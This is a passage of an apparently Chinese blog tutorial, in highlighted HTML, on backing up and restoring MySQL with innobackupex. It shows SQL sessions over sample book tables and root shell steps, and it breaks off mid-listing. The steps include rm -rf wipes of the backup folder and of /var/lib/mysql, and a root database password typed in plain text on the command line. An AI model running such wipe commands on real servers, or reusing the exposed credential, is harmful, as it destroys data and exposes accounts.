class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| TESTDB             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">7 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> BOOK;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| Tables_in_BOOK |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| book           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> testbookdb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| Tables_in_testbookdb |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| book1                |</span><br><span class="line">| book2                |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book1;</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">| bTypeId | bName                             | price | publishing            |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book2;</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| name                              | price | pages |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 |</span><br><span class="line">| &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 |</span><br><span class="line">| &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 |</span><br><span class="line">| &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> TESTDB;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_TESTDB |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| TABLE1           |</span><br><span class="line">| TABLE2           |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">|       7 | MySQL4 |    74 | QH         |</span><br><span class="line">|       8 | MySQL5 |    75 | QH         |</span><br><span class="line">|       9 | MySQL6 |    76 | QH         |</span><br><span class="line">|      10 | MySQL7 |    77 | QH         |</span><br><span class="line">|      11 | MySQL8 |    78 | QH         |</span><br><span class="line">|      12 | MySQL9 |    79 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| name   | price | pages |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| Linux  |    30 |   666 |</span><br><span class="line">| CLD    |    60 |   666 |</span><br><span class="line">| SYS    |    80 |   666 |</span><br><span class="line">| MySQL1 |   166 |   666 |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>&#x62D3;&#x5C55;&#xFF1A;&#x8FD8;&#x539F;&#x6570;&#x636E;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]# rm -rf /tmp/db_backup/*</span><br><span class="line">[root@server12 ~]# innobackupex --default-file=/etc/my.cnf --user=root --password=Jaking@vip.163.com --no-timestamp /tmp/db_backup/all-mysql-data</span><br><span class="line">[root@server12 ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| TESTDB             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">7 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> TESTDB666;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> TESTDB666;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TABLE1 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;DZ&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;RM&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;SYS&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;JX&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;MySQL2&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;MySQL3&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;7&apos;</span>,<span class="string">&apos;MySQL4&apos;</span>,<span class="string">&apos;74&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;8&apos;</span>,<span class="string">&apos;MySQL5&apos;</span>,<span class="string">&apos;75&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;9&apos;</span>,<span class="string">&apos;MySQL6&apos;</span>,<span class="string">&apos;76&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;10&apos;</span>,<span class="string">&apos;MySQL7&apos;</span>,<span class="string">&apos;77&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;11&apos;</span>,<span class="string">&apos;MySQL8&apos;</span>,<span class="string">&apos;78&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;12&apos;</span>,<span class="string">&apos;MySQL9&apos;</span>,<span class="string">&apos;79&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TABLE2 (<span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,pages <span class="built_in">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;60&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;SYS&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;166&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| Tables_in_TESTDB666 |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| TABLE1              |</span><br><span class="line">| TABLE2              |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">|       7 | MySQL4 |    74 | QH         |</span><br><span class="line">|       8 | MySQL5 |    75 | QH         |</span><br><span class="line">|       9 | MySQL6 |    76 | QH         |</span><br><span class="line">|      10 | MySQL7 |    77 | QH         |</span><br><span class="line">|      11 | MySQL8 |    78 | QH         |</span><br><span class="line">|      12 | MySQL9 |    79 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| name   | price | pages |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| Linux  |    30 |   666 |</span><br><span class="line">| CLD    |    60 |   666 |</span><br><span class="line">| SYS    |    80 |   666 |</span><br><span class="line">| MySQL1 |   166 |   666 |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]# innobackupex --user=root --password=Jaking@vip.163.com --no-timestamp --incremental /tmp/db_backup/incremental-mysql-data --incremental-basedir=/tmp/db_backup/all-mysql-data/</span><br><span class="line">[root@server12 ~]# ls /tmp/db_backup/</span><br><span class="line">all-mysql-data  incremental-mysql-data</span><br><span class="line">[root@server12 ~]# du -sh /tmp/db_backup/all-mysql-data/</span><br><span class="line">27M     /tmp/db_backup/all-mysql-data/</span><br><span class="line">[root@server12 ~]# du -sh /tmp/db_backup/incremental-mysql-data/</span><br><span class="line">4.8M    /tmp/db_backup/incremental-mysql-data/</span><br><span class="line"></span><br><span class="line">[root@server12 ~]# systemctl stop mysqld</span><br><span class="line">[root@server12 ~]# rm -rf /var/lib/mysql/*</span><br><span class="line">[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/</span><br><span class="line">backup-my.cnf   ibdata1             sys         xtrabackup_checkpoints</span><br><span class="line">BOOK            mysql               testbookdb  xtrabackup_info</span><br><span class="line">ib_buffer_pool  performance_schema  TESTDB      xtrabackup_logfile</span><br><span class="line">[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/</span><br><span class="line">backup-my.cnf   mysql               TESTDB666</span><br><span class="line">BOOK            performance_schema  xtrabackup_checkpoints</span><br><span class="line">ib_buffer_pool  sys                 xtrabackup_info</span><br><span class="line">ibdata1.delta   testbookdb          xtrabackup_logfile</span><br><span class="line">ibdata1.meta    TESTDB</span><br><span class="line">[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/TESTDB666 /tmp/db_backup/all-mysql-data/</span><br><span class="line">[root@server12 ~]# cp -ra /tmp/db_backup/incremental-mysql-data/ibdata1* /tmp/db_backup/all-mysql-data/</span><br><span class="line">[root@server12 ~]# ls /tmp/db_backup/all-mysql-data/</span><br><span class="line">backup-my.cnf   ibdata1.delta       sys         xtrabackup_checkpoints</span><br><span class="line">BOOK            ibdata1.meta        testbookdb  xtrabackup_info</span><br><span class="line">ib_buffer_pool  mysql               TESTDB      xtrabackup_logfile</span><br><span class="line">ibdata1         performance_schema  TESTDB666</span><br><span class="line">[root@server12 ~]# ls /tmp/db_backup/incremental-mysql-data/</span><br><span class="line">backup-my.cnf   mysql               TESTDB666</span><br><span class="line">BOOK            performance_schema  xtrabackup_checkpoints</span><br><span class="line">ib_buffer_pool  sys                 xtrabackup_info</span><br><span class="line">ibdata1.delta   testbookdb          xtrabackup_logfile</span><br><span class="line">ibdata1.meta    TESTDB</span><br><span class="line">[root@server12 ~]# innobackupex --copy-back /tmp/db_backup/all-mysql-data/</span><br><span class="line">[root@server12 ~]# ll /var/lib/mysql</span><br><span class="line">total 13912</span><br><span class="line">drwxr-x--- 2 root root       88 Apr 24 22:26 BOOK</span><br><span class="line">-rw-r----- 1 root root      315 Apr 24 22:26 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 root root 12582912 Apr 24 22:26 ibdata1</span><br><span class="line">-rw-r----- 1 root root  1622016 Apr 24 22:26 ibdata1.delta</span><br><span class="line">-rw-r----- 1 root root       60 Apr 24 22:26 ibdata1.meta</span><br><span class="line">drwxr-x--- 2 root root     4096 Apr 24 22:26 mysql</span><br><span class="line">drwxr-x--- 2 root root     8192 Apr 24 22:26 performance_schema</span><br><span class="line">drwxr-x--- 2 root root     8192 Apr 24 22:26 sys</span><br><span class="line">drwxr-x--- 2 root root       88 Apr 24 22:26 testbookdb</span><br><span class="line">drwxr-x--- 2 root root       92 Apr 24 22:26 TESTDB</span><br><span class="line">drwxr-x--- 2 root root      150 Apr 24 22:26 TESTDB666</span><br><span class="line">-rw-r----- 1 root root      482 Apr 24 22:26 xtrabackup_info</span><br><span class="line">[root@server12 ~]# chown -Rf mysql:mysql /var/lib/mysql</span><br><span class="line">[root@server12 ~]# ll /var/lib/mysql                   </span><br><span class="line">total 13912</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 22:26 BOOK</span><br><span class="line">-rw-r----- 1 mysql mysql      315 Apr 24 22:26 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 24 22:26 ibdata1</span><br><span 